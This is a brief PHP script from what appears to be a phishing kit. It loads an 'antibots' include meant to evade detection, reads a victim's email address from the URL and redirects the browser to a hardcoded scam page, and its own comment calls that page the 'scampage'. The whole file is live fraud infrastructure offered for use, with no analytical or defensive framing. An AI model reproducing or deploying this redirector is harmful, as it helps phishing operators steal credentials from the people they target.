<?php
include "antibots.php";

if(isset($_GET['email'])){

}

$scampageURL = "https://meaindia.in/nvv/newre/78Aia7PJn;h L"; // type the scampage url with http:// or https:// for example : https://www.google.com
$email = ($_GET['email']);
header("location: $scampageURL?email=$email");
?> 